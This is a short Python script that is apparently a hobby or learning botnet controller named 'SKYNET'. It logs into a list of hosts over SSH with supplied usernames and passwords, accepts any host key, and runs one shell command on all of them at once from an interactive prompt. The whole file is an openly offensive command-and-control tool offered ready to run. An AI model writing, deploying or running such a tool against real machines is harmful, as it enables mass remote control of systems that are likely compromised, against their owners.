#!/usr/bin/env python3
import cmd
import signal
from paramiko import SSHClient, AutoAddPolicy

botnet = []


class BotNet(cmd.Cmd):

    undoc_header = None
    doc_header = 'Commands (type help <command>):'

    def print_topics(self, header, cmds, cmdlen, maxcol):
        if header is not None:
            cmd.Cmd.print_topics(self, header, cmds, cmdlen, maxcol)

    prompt = '(SKYNET) '
    intro = """
                                          :s:                                             
                                        /dNMNh:                                           
                                      /dNMMMMMNh:                                         
                                    :dNMMMMMMMMMNh-                                       
                                  :hNMMMMMMMMMMMMMNy-                                     
                                :hNMMMMMMMMMMMMMMMMMNy-                                   
                                :hNMMMMMMMMMMMMMMMMMNd:                                   
                            :/`  `:hNMMMMMMMMMMMMMMd/`  ./.                               
                          :yNNd/`  `/dNMMMMMMMMMNd/`  .omNmo.                             
                        -yNMMMMNd+`  `/dNMMMMMNd+`  .omMMMMMmo.                           
                      -yNMMMMMMMMNd+`  `/dNMNd/`  .omNMMMMMMMNmo.                         
                    -yNMMMMMMMMMMMMNd+`  `+h/`  .omMMMMMMMMMMMMMmo.                       
                  -yNMMMMMMMMMMMMMMMMNd+.     .omMMMMMMMMMMMMMMMMMmo.                     
                -yNMMMMMMMMMMMMMMMMMMMMMm/   +mMMMMMMMMMMMMMMMMMMMMMm+`                   
              -yNMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMm+`                 
            -sNMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMNd+`               
          .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMNd+`             
        .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd/`           
      .sNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy   hMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNd/`         
    `+dmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmms   ymmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmy.        

                    _______ _     _ __   __ __   _ _______ _______
                    |______ |____/    \_/   | \  | |______    |   
                    ______| |    \_    |    |  \_| |______    |   
    """

    def cmdloop(self, intro=None):
        while True:
            try:
                cmd.Cmd.cmdloop(self, intro)
            except KeyboardInterrupt:
                print("\nExiting...\n")
                exit(0)
    
    def do_exec_command(self, command):
        """exec_command [uname -a]
        Add a client to the botnet"""
        for client in botnet:
            output = client.send_command(command)
            print('[*] Output from ' + client.host)
            print('[+] ' + output.decode())

    def do_add_client(self, client):
        """add_client [host user password]
        Add a client to the botnet"""
        if client:
            host, user, password = client.split(' ')
            c = Client(host, user, password)
            botnet.append(c)
            print("[+] ADDED CLIENT: " + host)

    def do_EOF(self, line):
        return True

    def postloop(self):
        print()


class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = SSHClient()
            s.set_missing_host_key_policy(AutoAddPolicy())
            s.connect(self.host, port=22, username=self.user,
                      password=self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error Connecting')
    
    def send_command(self, cmd):
        stdin, stdout, stderr = self.session.exec_command(cmd)
        return stdout.read()


if __name__ == '__main__':
    BotNet().cmdloop()
